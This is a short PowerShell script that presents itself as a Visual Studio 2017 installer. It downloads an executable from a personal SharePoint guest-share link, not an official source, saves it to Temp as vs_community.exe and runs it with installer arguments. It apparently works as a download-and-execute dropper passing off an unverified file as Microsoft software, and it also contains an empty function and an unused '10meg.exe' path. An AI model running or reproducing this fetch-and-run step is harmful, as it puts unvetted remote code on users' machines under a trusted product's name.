Function Get-RedirectedUrl
{
    Param (
        [Parameter(Mandatory=$true)]
        [String]$URL
    )  
}
$url = 'https://cheekandchongsupinthesmoke-my.sharepoint.com/personal/bulletformyvalentine_cheekandchongsupinthesmoke_onmicrosoft_com/_layouts/15/guestaccess.aspx?docid=119fa9020ec3b4595ba1062a2eaf30ab1&authkey=ATPQzQ23crlLEitcIDceGHE'
$codeSetupUrl = "$PSScriptroot\10meg.exe"
$vscodeSetup = "${env:Temp}\vs_community.exe"


try
{
    Invoke-WebRequest -Uri $Url -OutFile $vscodeSetup;
}
catch
{
    Write-Error "Failed to download VS 2017";
}
try
{
    Start-Process -FilePath $vscodeSetup -ArgumentList "--add Microsoft.VisualStudio.Workload.NetCoreTools;includeRecommended --passive";
}
catch
{
    Write-Error "Failed to install VS 2017";
}